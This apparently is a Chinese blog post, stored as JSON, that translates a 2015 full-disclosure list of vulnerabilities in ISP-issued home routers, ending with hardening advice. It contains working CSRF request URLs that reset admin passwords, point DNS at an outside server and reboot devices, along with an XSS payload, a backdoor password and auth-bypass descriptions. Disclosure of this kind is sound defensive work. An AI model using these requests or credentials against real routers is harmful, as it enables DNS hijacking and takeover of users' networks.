{"title":"路由器常见漏洞一览表","slug":"硬件物联/物联安全/网络设备/路由器常见漏洞一览表","date":"2019-04-16T18:36:30.000Z","updated":"2022-03-30T05:02:09.821Z","url":"2019/4-17-71.html","path":"api/articles/2019/4-17-71.html.json","covers":["https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190923122122.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190923122111.png"],"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h4><p>描述:路由器脆弱性披露网站<code>http://routerpwn.com/</code> (不过貌似已经没有更新了) </p>\n<h4 id=\"0x01-漏洞一览\"><a href=\"#0x01-漏洞一览\" class=\"headerlink\" title=\"0x01 漏洞一览\"></a>0x01 漏洞一览</h4><p>路由器60多个没公开的漏洞厂商设备列表如下：</p>\n<ol>\n<li>Observa Telecom AW4062</li>\n<li>Comtrend WAP-5813n</li>\n<li>Comtrend CT-5365</li>\n<li>D-Link DSL-2750B</li>\n<li>Belkin F5D7632-4</li>\n<li>Sagem LiveBox Pro 2 SP</li>\n<li>Amper Xavi 7968 and 7968+</li>\n<li>Sagem Fast 1201</li>\n<li>Linksys WRT54GL</li>\n<li>Observa Telecom RTA01N</li>\n<li>Observa Telecom Home Station BHS-RTA</li>\n<li>Observa Telecom VH4032N</li>\n<li>Huawei HG553</li>\n<li>Huawei HG556a</li>\n<li>Astoria ARV7510</li>\n<li>Amper ASL-26555</li>\n<li>Comtrend AR-5387un</li>\n<li>Netgear CG3100D</li>\n<li>Comtrend VG-8050</li>\n<li>Zyxel P 660HW-B1A</li>\n<li>Comtrend 536+</li>\n<li>D-Link DIR-600</li>\n</ol>\n<p><br></p>\n<p>每款路由器对应的主要漏洞类型有:</p>\n<ul>\n<li>存储行xss:<br>#1, #2, #3, #6, #10, #12, #13,#14, #16, #17, #18, #19 and #20</li>\n<li>非认证xss访问:<br>#3, #7, #8, #9, #10, #14, #16,#17 and #19.</li>\n<li>CSRF 漏洞:<br>#1, #2, #3, #5, #10, #12, #13, #14,#15, #16, #18 and #20.</li>\n<li>DDOS漏洞:<br>#1, #5 and #10.</li>\n<li>提权漏洞:<br>#1</li>\n<li>信息泄漏:<br>#11</li>\n<li>后门<br>#10</li>\n<li>使用SMB符号链接绕过认证<br>#12</li>\n<li>USB设备绕过认证<br>#12, #13, #14 and #15</li>\n<li>认证绕过<br>#14<br>-即插即用相关漏洞:<br>#2, #3, #4, #5, #6,#7, #10, #11, #12, #13, #14, #16, #21 and #22</li>\n</ul>\n<p><br></p>\n<h4 id=\"0x01-漏洞详细\"><a href=\"#0x01-漏洞详细\" class=\"headerlink\" title=\"0x01 漏洞详细\"></a>0x01 漏洞详细</h4><h5 id=\"Observa-Telecom\"><a href=\"#Observa-Telecom\" class=\"headerlink\" title=\"Observa Telecom\"></a>Observa Telecom</h5><p>型号: AW4062<br>测试的固件: 1.3.5.18 and 1.4.2 (latest)<br>注释:在西班牙isp于2012年广泛给adsl用户派发的路由器<br>漏洞描述:</p>\n<ul>\n<li><p>存储型xss:<br>多个xss漏洞被发现于路由器的配置菜单项,可以让攻击者执行恶意代码<br>POC:在域名阻止的子目录的input字段没有做好相应的过滤,该功能主要用于阻止路由器访问制定的域名。然而domain的表单input字段允许攻击者输入js恶意脚本,当管理员每次访问该功能时,会触发存储型xss.<br>在防火墙/url阻断,防火墙/端口转发字段也有相应的漏洞。</p>\n</li>\n<li><p>csrf漏洞:<br>路由器的ping功能是通过GET传递,没有csrf token<br><a href=\"http://192.168.1.1/goform/formPing?pingAddr=37.252.96.88\" target=\"_blank\" rel=\"noopener\">http://192.168.1.1/goform/formPing?pingAddr=37.252.96.88</a></p>\n</li>\n<li><p>修改密码:<br><a href=\"http://192.168.1.1/goform/formPasswordSetup?userMode=0&amp;oldpass=1234&amp;newpass=12345&amp;confpass=12345&amp;save=%22Apply%20Changes%22\" target=\"_blank\" rel=\"noopener\">http://192.168.1.1/goform/formPasswordSetup?userMode=0&amp;oldpass=1234&amp;newpass=12345&amp;confpass=12345&amp;save=%22Apply%20Changes%22</a></p>\n</li>\n<li><p>DNS修改:<br><a href=\"http://192.168.1.1/goform/formDNS?dnsMode=dnsManual&amp;dns1=37.252.96.88&amp;dns2=&amp;dns3=\" target=\"_blank\" rel=\"noopener\">http://192.168.1.1/goform/formDNS?dnsMode=dnsManual&amp;dns1=37.252.96.88&amp;dns2=&amp;dns3=</a></p>\n</li>\n<li><p>权限提升:<br>当没有管理员权限的用户连接到路由器的FTP后,可以下载/etc/passwd和config.xml文件,其中config.xml存储路由器的明文配置信息,包括管理员用户的帐号。</p>\n</li>\n<li><p>拒绝服务:</p>\n</li>\n<li>可以通过csrf来实现远程路由器关机，当受害者打开这个页面后,路由器会在60秒内重启<br><a href=\"http://192.168.1.1/goform/admin/formReboot\" target=\"_blank\" rel=\"noopener\">http://192.168.1.1/goform/admin/formReboot</a></li>\n</ul>\n<p><br></p>\n<h5 id=\"Comtrend\"><a href=\"#Comtrend\" class=\"headerlink\" title=\"Comtrend\"></a>Comtrend</h5><p>型号: WAP-5813n (tested in Product Numbers 723306-104 and 723306-033)<br>测试的固件: P401-402TLF-C02_R35 and P401-402TLF-C04_R09 (latest one)<br>注释: 西班牙isp在2011年到2014年给FTTH用户广泛派发的路由器<br>漏洞描述:</p>\n<ul>\n<li><p>存储型xss:<br>路由器的SSID可以输入恶意的js脚本,当管理员查看无线-&gt;安全功能和无线-&gt;MAC地址过滤功能时会触发</p>\n</li>\n<li><p>CSRF:<br>当请求这个连接的时候,会修改管理员密码为1234567890<br><a href=\"http://192.168.1.1/password.cgi?adminPassword=1234567890\" target=\"_blank\" rel=\"noopener\">http://192.168.1.1/password.cgi?adminPassword=1234567890</a></p>\n</li>\n<li><p>DNS修改:<br><a href=\"http://192.168.1.1/dnscfg.cgi?dnsPrimary=37.252.96.88&amp;dnsSecondary=37.252.96.89&amp;dnsIfc=&amp;dnsRefresh=1\" target=\"_blank\" rel=\"noopener\">http://192.168.1.1/dnscfg.cgi?dnsPrimary=37.252.96.88&amp;dnsSecondary=37.252.96.89&amp;dnsIfc=&amp;dnsRefresh=1</a></p>\n</li>\n<li><p>UPNP弱认证导致可以修改防火墙规则:<br>可以通过UPNP请求,修改路由器的端口映射,以及中断WAN连接。</p>\n</li>\n</ul>\n<p><br></p>\n<h5 id=\"Belkin\"><a href=\"#Belkin\" class=\"headerlink\" title=\"Belkin\"></a>Belkin</h5><p>型号: F5D7632-4<br>测试的固件: 6.01.04<br>漏洞描述:</p>\n<ul>\n<li>csrf:改变dns<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.2.1&#x2F;cgi-bin&#x2F;setup_dns.exe?page&#x3D;&quot;setup_dns&quot;&amp;logout&#x3D;&quot;&quot;&amp;dns1_1&#x3D;37&amp;dns1_2&#x3D;252&amp;dns1_3&#x3D;96&amp;dns1_4&#x3D;88&amp;dns2_1&#x3D;37&amp;dns2_2&#x3D;252&amp;dns2_3&#x3D;96&amp;dns2_4&#x3D;89</span><br></pre></td></tr></table></figure></li>\n<li><p>拒绝服务:通过下面的请求重启路由器<br><a href=\"http://192.168.2.1/cgi-bin/restart.exe?page=&quot;tools_gateway&quot;&amp;logout=&quot;&quot;\" target=\"_blank\" rel=\"noopener\">http://192.168.2.1/cgi-bin/restart.exe?page=&quot;tools_gateway&quot;&amp;logout=&quot;&quot;</a>;</p>\n</li>\n<li><p>UPNP弱认证导致可以修改防火墙规则:可以通过UPNP请求,修改路由器的端口映射,以及中断WAN连接。</p>\n</li>\n</ul>\n<p><br></p>\n<h5 id=\"Linksys\"><a href=\"#Linksys\" class=\"headerlink\" title=\"Linksys\"></a>Linksys</h5><p>型号: WRT54GL<br>测试的固件: 4.30.16 build 6<br>漏洞描述:</p>\n<ul>\n<li>非认证的xss:<br>攻击者只需发送一个DHCP的PDU请求,在请求中包含恶意的JS语句,当管理员查看路由器的状态-&gt;本地网络-&gt;DHCP客户端时会触发<br><br></li>\n</ul>\n<h5 id=\"Observa-Telecom-1\"><a href=\"#Observa-Telecom-1\" class=\"headerlink\" title=\"Observa Telecom\"></a>Observa Telecom</h5><p>型号: RTA01N<br>固件测试: RTK_V2.2.13<br>漏洞描述:</p>\n<ul>\n<li><p>存储型xss:<br>在DDNS的主机名输入列,输入恶意的js脚本,当管理员访问服务-&gt;DDNS时会触发</p>\n</li>\n<li><p>csrf:<br>当受害者访问此URL时,会修改DNS</p>\n</li>\n</ul>\n<p><a href=\"http://192.168.1.1/form2Dns.cgi?dnsMode=&quot;1&quot;&amp;dns1=&quot;37.252.96.88&quot;&amp;dns2=&quot;37.252.96.89&quot;&amp;dns3=&quot;&quot;&amp;submit.htm?dns.htm=&quot;Send&quot;&amp;save=&quot;Aplicarcambios&quot;\" target=\"_blank\" rel=\"noopener\">http://192.168.1.1/form2Dns.cgi?dnsMode=&quot;1&quot;&amp;dns1=&quot;37.252.96.88&quot;&amp;dns2=&quot;37.252.96.89&quot;&amp;dns3=&quot;&quot;&amp;submit.htm?dns.htm=&quot;Send&quot;&amp;save=&quot;Aplicarcambios&quot;</a></p>\n<ul>\n<li><p>非认证的xss:<br>攻击者只需发送一个DHCP的PDU请求,在请求中包含恶意的JS语句,当管理员查看路由器的状态-&gt;本地网络-&gt;DHCP客户端时会触发</p>\n</li>\n<li><p>后门:admin用户的另一个帐号密码是7449airocon,可以通过路由器的备份功能,备份出xml文件,然后查看到。</p>\n</li>\n<li><p>UPNP弱认证导致可以修改防火墙规则:可以通过UPNP请求,修改路由器的端口映射,以及中断WAN连接。<br><br></p>\n</li>\n</ul>\n<h5 id=\"Observa-Telecom-2\"><a href=\"#Observa-Telecom-2\" class=\"headerlink\" title=\"Observa Telecom\"></a>Observa Telecom</h5><p>型号: VH4032N<br>测试固件: VH4032N_V0.2.35<br>注释: 沃达丰isp给他们客户最常见的路由器<br>漏洞描述:</p>\n<ul>\n<li><p>存储型xss:<br>将SSID输入“‘; <code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;</code>//”,会在管理员查看WEB接口时触发</p>\n</li>\n<li><p>csrf:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#受害者打开该连接后,会修改密码</span></span><br><span class=\"line\">http://192.168.0.1/en_US/administration.cgi?usrPassword=newpass</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#打开FTP服务,并且修改密码</span></span><br><span class=\"line\">http://192.168.0.1/en_US/config_ftp.cgi?ftpEnabled=1&amp;ftpUserName=vodafone&amp;ftpPassword=vulnpass&amp;ftpPort=21&amp;ftpAclMode=2</span><br></pre></td></tr></table></figure></li>\n<li><p>通过SMB符号链接绕过认证:<br>攻击者可以通过路由器的SMB服务新建符号链接,然后下载配置文件以及内核文件系统,比如将一个符号链接指向/,就有可能下载路由器的整个文件系统</p>\n</li>\n<li><p>USB设备绕过认证:<br>攻击者仅仅需要访问路由器的9000端口,无需任何认证,就可以访问到插在路由器上USB接口的设备,下载,修改,上传文件。</p>\n</li>\n<li><p>UPNP弱认证导致可以修改防火墙规则:可以通过UPNP请求,修改路由器的端口映射,以及中断WAN连接。<br><br></p>\n</li>\n</ul>\n<h5 id=\"Huawei\"><a href=\"#Huawei\" class=\"headerlink\" title=\"Huawei\"></a>Huawei</h5><p>型号: HG553<br>测试的固件: V100R001C03B043SP01<br>注释: 沃达丰isp给他们客户最常见的路由器<br>漏洞描述:</p>\n<ul>\n<li><p>USB设备绕过认证:<br>攻击者仅仅需要访问路由器的9000端口,无需任何认证,就可以访问到插在路由器上USB接口的设备,下载,修改,上传文件。</p>\n</li>\n<li><p>认证绕过:<br>无需认证就可以访问/rebootinfo.cgi,强制路由器恢复到出厂状态,然后攻击者使用默认帐号登录路由器</p>\n</li>\n<li><p>csrf:<br>受害者访问该连接后,会修改路由器密码<br><a href=\"http://192.168.0.1/userpasswd.cgi?usrPassword=newpassword\" target=\"_blank\" rel=\"noopener\">http://192.168.0.1/userpasswd.cgi?usrPassword=newpassword</a></p>\n</li>\n<li><p>UPNP弱认证导致可以修改防火墙规则:可以通过UPNP请求,修改路由器的端口映射,以及中断WAN连接。</p>\n</li>\n</ul>\n<p><br></p>\n<h4 id=\"0x04-其他常见漏洞\"><a href=\"#0x04-其他常见漏洞\" class=\"headerlink\" title=\"0x04 其他常见漏洞\"></a>0x04 其他常见漏洞</h4><p><strong>0.破解401认证的路由器密码</strong><br>描述：401认证就是HTTP 基本验证， 需客户端提供的验证请求在HTTP协议中被定义为WWW –验证标头字段 (WWW-Authenticate header field)。<br>很多路由器登陆的时候都是401认证，像也有一些站点访问的时候会弹出一个框让你来输入用户名和密码<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190923122122.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>利用auxiliary/scanner/http/http_login模块来破解路由器密码</p>\n<ul>\n<li>输入use auxiliary/scanner/http/http_login</li>\n<li>输入show info<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190923122111.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n</li>\n</ul>\n<hr>\n\n<h4 id=\"0x05-安全建议\"><a href=\"#0x05-安全建议\" class=\"headerlink\" title=\"0x05 安全建议\"></a>0x05 安全建议</h4><p>建议:不要授权路由器管理端口外网访问、修改路由器默认管理尼玛、上网查查路由器是否有隐藏管理密码如果有也要修改、及时更新路由器新版本固件、使用安全客app订阅路由器厂商及型号关键词,第一时间了解相关漏洞及补丁公告。</p>\n<p>路由器不应当对外开放任何不必要的端口和服务,包括NTP、DNS、TFTP、SNMP等。 同时应当避免讲内网服务通过Nat地址映射的方式共享至外网</p>\n<hr>\n\n<h4 id=\"0x06-总结\"><a href=\"#0x06-总结\" class=\"headerlink\" title=\"0x06 总结\"></a>0x06 总结</h4><ul>\n<li>原文参考:<a href=\"http://seclists.org/fulldisclosure/2015/May/129\" target=\"_blank\" rel=\"noopener\">http://seclists.org/fulldisclosure/2015/May/129</a></li>\n</ul>\n","comments":true,"excerpt":"注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。[TOC]","categories":[{"name":"硬件设备缺陷","path":"api/categories/硬件设备缺陷.json"}],"tags":[{"name":"Router","path":"api/tags/Router.json"}]}